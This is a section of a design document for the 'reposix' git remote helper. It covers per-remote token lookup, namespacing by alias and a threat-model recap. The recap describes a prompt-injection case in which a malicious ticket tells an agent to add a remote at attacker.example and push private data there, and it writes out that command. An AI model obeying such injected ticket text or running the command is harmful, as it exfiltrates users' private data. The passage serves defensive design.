← [back to index](./index.md)

# 8. Authentication and Per-Remote Namespacing

### 8.1 Where credentials come from

Three legitimate sources, in priority order:

1. **Per-remote env var.** `REPOSIX_TOKEN_<ALIAS>` — e.g. for remote named `prod`, `REPOSIX_TOKEN_PROD=ghp_xxxx`. This lets the agent or human keep multiple remotes' credentials separate in the shell environment.
2. **Global env var.** `REPOSIX_TOKEN` — the catch-all when there's only one remote.
3. **Git config.** `git config remote.<alias>.reposixToken <token>` — persists across shells. Read via `git config --get` (subprocess; do not parse `.git/config` ourselves).
4. **Global git config fallback.** `git config --global reposix.token <token>` — for users with one personal token shared across all remotes.

### 8.2 Why namespace by `<alias>` and not by URL

`git-remote-reposix` is invoked with `(alias, url)`. The alias is the user's chosen name (`origin`, `prod`, `staging`). Namespacing by alias means:
- The same simulator at `http://localhost:7777` can be added as both `local-dev` and `local-test` with different tokens.
- Tokens never appear in URLs (no `http://user:pass@host` smell).
- Agents can't accidentally exfiltrate creds by inspecting `git remote -v`.

### 8.3 Special case: anonymous one-shot URLs

If the user runs `git push reposix::http://localhost:7777/projects/demo` *without* first `git remote add`, git invokes us with `alias == url` (no nickname exists). In that case, fall back to env vars only — we have nowhere persistent to read config from, and we should not invent a name. (git-remote-hg handles this exact edge case by sha1-ing the URL into a synthetic alias for its mark file path; we do the same:)

```rust
let storage_alias = if alias == url {
    let mut h = sha1::Sha1::new();
    sha1::Digest::update(&mut h, url.as_bytes());
    hex::encode(sha1::Digest::finalize(h))
} else {
    alias.clone()
};
let storage_dir = std::path::PathBuf::from(&git_dir)
    .join("reposix")
    .join(&storage_alias);
```

### 8.4 Threat model recap (per PROJECT.md)

The threat model in `PROJECT.md` flags the lethal trifecta: private remote data + untrusted ticket text + git-push exfiltration. Helper-side mitigations:

- **Audit log.** Every outgoing HTTP call is logged to `runtime/audit.db` (the SQLite WAL the project already plans). One row per call: `(timestamp, alias, method, path, status, agent_pid, request_sha, response_sha)`. The orchestrator can `sqlite3 audit.db 'SELECT ... WHERE alias=? AND method != "GET"'` to review every write the helper made.
- **Refuse to push to an unconfigured remote.** If the alias has no token in any of the four sources, `error <ref> "no token configured for remote <alias>; set REPOSIX_TOKEN_<ALIAS> or git config remote.<alias>.reposixToken"`. Do not silently fall back to anonymous; that risks a malicious ticket telling the agent to `git remote add evil reposix::http://attacker.example/...` and then having writes succeed unauthenticated.
- **Tainted-content marking.** When emitting fast-import blobs, prefix any field whose content originated from an issue body (vs. structured metadata) with the `tainted:` xattr equivalent — TBD how this surfaces, but the helper is the chokepoint where the marking should happen.
